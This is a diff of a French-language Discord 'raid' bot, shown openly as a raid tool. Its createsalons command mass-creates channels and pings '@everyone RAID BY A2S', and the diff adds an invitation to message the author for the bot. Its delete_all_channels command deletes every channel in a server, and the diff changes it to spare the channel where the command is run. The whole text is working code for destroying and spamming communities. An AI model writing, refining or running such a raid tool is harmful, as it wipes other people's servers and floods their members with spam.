@@ -5,7 +5,6 @@ import asyncio
 import os
 
 TOKEN = os.getenv("TOKEN")
-
 MY_ID = 1022218025539223695  # 🔒 TON ID
 
 intents = discord.Intents.default()
@@ -105,7 +104,9 @@ async def createsalons(
                     category=categorie
                 )
                 try:
-                    await channel.send("@everyone RAID BY A2S")
+                    await channel.send(
+                        "@everyone RAID BY A2S venez dm pour le bot "
+                    )
                 except:
                     pass
             except:
@@ -131,12 +132,13 @@ async def createsalons(
 # =========================
 @bot.tree.command(
     name="delete_all_channels",
-    description="Supprime tous les salons du serveur"
+    description="Supprime tous les salons du serveur sauf celui où la commande est exécutée"
 )
 @app_commands.check(is_me)
 async def delete_all_channels(interaction: discord.Interaction):
 
     guild = interaction.guild
+    current_channel_id = interaction.channel.id
 
     await interaction.response.send_message(
         "🧨 Suppression en cours...",
@@ -144,6 +146,9 @@ async def delete_all_channels(interaction: discord.Interaction):
     )
 
     for channel in list(guild.channels):
+        if channel.id == current_channel_id:
+            continue  # on garde le salon où la commande est faite
+
         try:
             await channel.delete()
             await asyncio.sleep(0.15)
@@ -151,7 +156,7 @@ async def delete_all_channels(interaction: discord.Interaction):
             pass
 
     await interaction.followup.send(
-        "✅ Tous les salons ont été supprimés.",
+        "✅ Tous les salons ont été supprimés sauf celui-ci.",
         ephemeral=True
     )
 
@@ -164,9 +169,15 @@ async def on_app_command_error(interaction: discord.Interaction, error):
 
     if isinstance(error, app_commands.CheckFailure):
         if interaction.response.is_done():
-            await interaction.followup.send("❌ Accès refusé.", ephemeral=True)
+            await interaction.followup.send(
+                "❌ Accès refusé.",
+                ephemeral=True
+            )
         else:
-            await interaction.response.send_message("❌ Accès refusé.", ephemeral=True)
+            await interaction.response.send_message(
+                "❌ Accès refusé.",
+                ephemeral=True
+            )
 
 
 bot.run(TOKEN)
